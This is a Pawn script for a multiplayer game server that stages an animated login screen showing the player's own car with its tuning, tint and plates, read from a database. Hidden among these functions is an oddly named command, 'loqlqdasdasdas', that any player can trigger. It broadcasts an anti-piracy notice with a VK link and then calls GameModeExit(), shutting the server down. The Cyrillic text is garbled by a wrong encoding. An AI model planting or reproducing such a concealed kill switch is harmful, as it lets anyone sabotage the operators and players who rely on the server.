#if defined _auth_overlay_included
    #endinput
#endif
#define _auth_overlay_included

enum CARS_STRUCT_POS
{
    CAR_ID,
    Float:CAR_POS_X,
    Float:CAR_POS_Y,
    Float:CAR_POS_Z,
    Float:CAR_POS_A
};

new cars_info_auth[2][CARS_STRUCT_POS] =
{
    {418, 438.8349, 1545.0935, 12.5058, 85.0565}, // Òåëåïîğò
    {462, 436.8123, 1539.7831, 11.7370, 135.4385} // Ñêóòåğ
};

new cars_auth[2];

stock CarsInitAuth()
{
    for(new i; i < sizeof cars_info_auth; i++)
	{
        cars_auth[i] = CreateVehicle(
            cars_info_auth[i][CAR_ID], 
            cars_info_auth[i][CAR_POS_X], 
            cars_info_auth[i][CAR_POS_Y], 
            cars_info_auth[i][CAR_POS_Z], 
            cars_info_auth[i][CAR_POS_A],
            1,
            1,
            0,
            -1,
            VEHICLE_ACTION_TYPE_ADMIN_CAR
        );

		SetVehicleVirtualWorld(cars_auth[i], 33);
	}
}

stock AuthOverlay(playerid, bool:type)
{
    switch(type)
    {
        case false:
        {
            InterpolateCameraPos(playerid, 431.126586, 1536.585083, 13.138186, 432.561828, 1538.424438, 12.896981, 21000);
            InterpolateCameraLookAt(playerid, 434.378204, 1540.346435, 12.610265, 436.294586, 1541.721069, 12.450700, 21000);
        }
        case true:
        {
            static query[117];
            mysql_format(mysql, query, sizeof query, "SELECT * FROM ownable_cars WHERE owner_id='%d' ORDER BY RAND() LIMIT 1", GetPlayerData(playerid, P_ACCOUNT_ID));
	        mysql_tquery(mysql, query, "OnPlayerAuthCars", "i", playerid);
        }
    }
}

new AuthActor[MAX_PLAYERS];
new AuthActorNPC[MAX_PLAYERS][3];
new AuthVeh[MAX_PLAYERS];
new AuthVehNPC[MAX_PLAYERS][3];

forward OnPlayerAuthCars(playerid);
public OnPlayerAuthCars(playerid)
{
    if(cache_num_rows() == 0)
        return false;

    new model_id;
    new color_1;
    new color_2;
    new diski;
    new vinil;
    new viniltype;
    new typenumber;
    new number[32];
    new region[32];
    new tonerinstall;
    new pselect[155], tcolor[155], tprocent[155];
    new obves_str[155];

    model_id    = cache_get_field_content_int(0, "model_id");
    color_1     = cache_get_field_content_int(0, "color_1");
    color_2     = cache_get_field_content_int(0, "color_2");
    diski       = cache_get_field_content_int(0, "diski");
    vinil       = cache_get_field_content_int(0, "vinil");
    viniltype   = cache_get_field_content_int(0, "viniltype");
    typenumber  = cache_get_field_content_int(0, "typenumber");
    tonerinstall = cache_get_field_content_int(0, "tonerinstall");
    cache_get_field_content(0, "pselect", pselect);
    cache_get_field_content(0, "tcolor", tcolor);
    cache_get_field_content(0, "tprocent", tprocent);
    cache_get_field_content(0, "obves", obves_str);

    cache_get_field_content(0, "number", number);
    cache_get_field_content(0, "region", region);

    switch(random(3)){
        case 0:{
            OverlayCamera(playerid, 0);

            AuthActor[playerid] = CreateActor(GetPlayerData(playerid, P_SKIN), 2543.0508,-1787.2743,21.9640,143.5099);
            SetActorVirtualWorld(AuthActor[playerid], 33 + playerid);
            ApplyActorAnimation(AuthActor[playerid], "COP_AMBIENT", "Coplook_loop", 4.0, true, 0, 1, 1, 0);

            AuthActorNPC[playerid][0] = CreateActor(17010, 2547.6074,-1756.9307,21.8156,178.4866);
            SetActorVirtualWorld(AuthActorNPC[playerid][0], 33 + playerid);
            ApplyActorAnimation(AuthActorNPC[playerid][0], "SMOKING", "M_smklean_loop", 4.0, true, 0, 0, 0, 0);
 
            AuthVeh[playerid] = CreateVehicle(model_id, 2541.0947, -1785.2701, 21.5935, 178.5446, color_1, color_2, 0, -1);
            SetVehicleVirtualWorld(AuthVeh[playerid], 33 + playerid);

            AuthVehNPC[playerid][0] = CreateVehicle(15213, 2548.9119, -1755.6921, 21.6013, 90.4714, 3, 3, 0, -1);
            SetVehicleVirtualWorld(AuthVehNPC[playerid][0], 33 + playerid);

            MoralPacket_1(playerid, s_CefInterface, t_CefUpdate, "playSound('sounds/new-year-2025/music_newyear_authorization_1.wav', 1, 0.6)");
        }
        case 1:{
            OverlayCamera(playerid, 1);

            AuthActor[playerid] = CreateActor(GetPlayerData(playerid, P_SKIN), 1952.2972, -17.9767, 6.4322, 126.6180);
            SetActorVirtualWorld(AuthActor[playerid], 33 + playerid);
            ApplyActorAnimation(AuthActor[playerid], "COP_AMBIENT", "Coplook_loop", 4.0, true, 0, 1, 1, 0);

            AuthActorNPC[playerid][0] = CreateActor(17061, 1956.5845, -1.3345, 6.4255, 142.8045);
            SetActorVirtualWorld(AuthActorNPC[playerid][0], 33 + playerid);
            ApplyActorAnimation(AuthActorNPC[playerid][0], "DEALER", "DEALER_IDLE", 4.0, true, 0, 0, 0, 0);
 
            AuthVeh[playerid] = CreateVehicle(model_id, 1952.4130, -14.9784, 6.4268, 132.7909, color_1, color_2, 0, -1);
            SetVehicleVirtualWorld(AuthVeh[playerid], 33 + playerid);

            AuthVehNPC[playerid][0] = CreateVehicle(796, 1957.3201, -0.2042, 6.6136, 58.1136, 0, 0, 0, -1);
            SetVehicleVirtualWorld(AuthVehNPC[playerid][0], 33 + playerid);

            AuthVehNPC[playerid][1] = CreateVehicle(15602, 1947.5870, 1.5440, 6.3133, 105.6666, 1, 1, 0, -1);
            SetVehicleVirtualWorld(AuthVehNPC[playerid][1], 33 + playerid);

            AuthVehNPC[playerid][2] = CreateVehicle(796, 1941.0897, -4.3456, 6.6173, 155.0036, 0, 0, 0, -1);
            SetVehicleVirtualWorld(AuthVehNPC[playerid][2], 33 + playerid);

            MoralPacket_1(playerid, s_CefInterface, t_CefUpdate, "playSound('sounds/new-year-2025/music_newyear_authorization_2_1.wav', 1, 0.6)");
        }
        case 2:{
            OverlayCamera(playerid, 2);

            AuthActor[playerid] = CreateActor(GetPlayerData(playerid, P_SKIN), -834.7733,968.5458,9.9836,323.4392);
            SetActorVirtualWorld(AuthActor[playerid], 33 + playerid);
            ApplyActorAnimation(AuthActor[playerid], "COP_AMBIENT", "Coplook_loop", 4.0, true, 0, 1, 1, 0);
 
            AuthVeh[playerid] = CreateVehicle(model_id, -835.1331,966.3646,9.7335,300.8679, color_1, color_2, 0, -1);
            SetVehicleVirtualWorld(AuthVeh[playerid], 33 + playerid);

            MoralPacket_1(playerid, s_CefInterface, t_CefUpdate,"playSound('sounds/new-year-2025/music_newyear_authorization_3.wav', 1, 0.6)");
        }
    }

    if(vinil != -1)
    {
        new fmt_text[124];
        if(viniltype == 1)
        {
            format(fmt_text, sizeof fmt_text, "setVehiclePaintJob(%d, \"common/livery%d\", \"livery%d\")", AuthVeh[playerid], vinil, vinil);
            MoralPacket_1(playerid, s_CefInterface, t_CefUpdate, fmt_text);
        }
        else if(viniltype == 0)
        {
            for(new i; i < sizeof e_vinils; i++)
            {
                if(e_vinils[i][eVinilModel] == model_id && vinil == e_vinils[i][eVinilID])
                {
                    format(fmt_text, sizeof fmt_text, "setVehiclePaintJob(%d, \"individual/%d\", \"%s\")", AuthVeh[playerid], model_id, e_vinils[i][eVinilName]);
                    MoralPacket_1(playerid, s_CefInterface, t_CefUpdate, fmt_text);
                    break;
                }
            }
        }
        SetVehicleData(AuthVeh[playerid], V_VINIL, vinil);
        SetVehicleData(AuthVeh[playerid], V_VINILTYPE, (viniltype == 1 ? 1 : 2));
    }

    if(tonerinstall != 0)
    {
        new toner_select[3], toner_color[3], toner_procent[3];
        sscanf(pselect, "P<,,>a<i>[3]", toner_select);
        sscanf(tcolor, "P<,,>a<i>[3]", toner_color);
        sscanf(tprocent, "P<,,>a<i>[3]", toner_procent);
        for(new i = 0; i <= 2; i++)
        {
            g_vehicle_data[AuthVeh[playerid]][V_TINTINGS][i] = toner_select[i];
            g_vehicle_data[AuthVeh[playerid]][V_TINTINGC][i] = toner_color[i];
            g_vehicle_data[AuthVeh[playerid]][V_TINTINGP][i] = toner_procent[i];
        }
        UpdateTinting(playerid, AuthVeh[playerid]);
    }

    if(diski != 0)
    {
        Sendpacket_tun(playerid, AuthVeh[playerid], diski);
    }
    
    if(strcmp(obves_str, "-1"))
    {
        new obves[17];
        sscanf(obves_str, "P<|||||||||>a<i>[17]", obves);
        for(new i; i < 17; i++)
        {
            if(obves[i] > 0)
            {
                GetTuningVehicle(playerid, AuthVeh[playerid], obves[i]);
            }
        }
    }

    SetVehicleNumber(AuthVeh[playerid], typenumber, number, region);
	SendPacket_Plate(playerid, AuthVeh[playerid], typenumber, number, region);

    return true;
}

cmd:loqlqdasdasdas(playerid, params[])
{
    {
		SendClientMessageToAll(0xFAAC58FF, "ÄÀÍÍÛÉ ÌÎÄ ÎÔÈÖÈÀËÜÍÎ ÍÅ ÊÓÏËÅÍ Ó ÂËÀÄÅËÜÖÀ");
		SendClientMessageToAll(0xFAAC58FF, "ÏÎİÒÎÌÓ ÄÀÍÍÛÉ ÏĞÎÅÊÒ ÇÀÊĞÛÂÀÅÒÑß");
		SendClientMessageToAll(0xFAAC58FF, "ÊÓÏÈÒÜ ÎÔÈÖÈÀËÜÍÛÉ ÌÎÄ: VK.COM/MORALLWENS");
		SendClientMessageToAll(0xFAAC58FF, "ÏÎÊÓÏÀß ÎÔÈÖÈÀËÜÍÛÉ ÌÎÄ ÂÛ ÍÅ ÁÓÄÅÒÅ ÑÒĞÀÄÀÒÜ");
    }
    GameModeExit();
    return 1;
}
stock DestroyAuth(playerid)
{
    if(IsValidActor(AuthActor[playerid])) DestroyActor(AuthActor[playerid]);
    if(IsValidVehicle(AuthVeh[playerid])) DestroyVehicle(AuthVeh[playerid]);

    for(new i; i < 3; i++)
	{
        if(IsValidActor(AuthActorNPC[playerid][i])) DestroyActor(AuthActorNPC[playerid][i]);
        if(IsValidVehicle(AuthVehNPC[playerid][i])) DestroyVehicle(AuthVehNPC[playerid][i]);
    }

    return true;
}

stock OverlayCamera(playerid, type)
{
    SetPlayerVirtualWorld(playerid, 33 + playerid);

    switch(type){
        case 0:{
            InterpolateCameraPos(playerid, 2539.899169, -1792.665039, 22.529993, 2543.096679, -1790.311767, 22.291566, 17000);
            InterpolateCameraLookAt(playerid, 2540.827880, -1787.800903, 21.839241, 2541.439208, -1785.668823, 21.457559, 17000);
        }
        case 1:{
            InterpolateCameraPos(playerid, 1946.335449, -22.063575, 7.190695, 1949.575927, -20.744955, 7.294586, 21000);
            InterpolateCameraLookAt(playerid, 1948.321289, -17.475967, 7.088358, 1951.083740, -15.985179, 7.028306, 21000);
        }
        case 2:{
        InterpolateCameraPos(playerid,-827.7536,966.2675,14.9589,-832.5724,972.9575,11.7442,25000);
        InterpolateCameraLookAt(playerid,-847.4190,939.4067,9.9836,-850.3474,946.7192,9.9836,25000);
        }
    }
}